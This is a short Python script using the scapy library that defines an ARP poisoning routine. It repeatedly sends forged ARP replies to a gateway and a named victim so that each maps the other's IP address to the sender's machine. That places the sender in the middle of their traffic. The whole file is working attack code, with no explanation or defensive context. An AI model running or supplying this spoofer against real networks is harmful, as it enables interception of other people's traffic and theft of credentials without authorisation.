from scapy.all import *
from scapy.layers.inet import ARP
import time
def arp_poison(gateway,victim):
    mac_gateway=getmacbyip(gateway)
    mac_victim=getmacbyip(victim)
    while True:
        print("Spoofing started:")
        spoof=ARP(pdst=gateway,hwdst=mac_gateway,op=2,psrc=victim)
        send(spoof,verbose=False)
        spoof=ARP(pdst=victim,hwdst=mac_victim,op=2,psrc=gateway)
        send(spoof,verbose=False)
        print("Going to inactive mode for 10s:")
        time.sleep(10)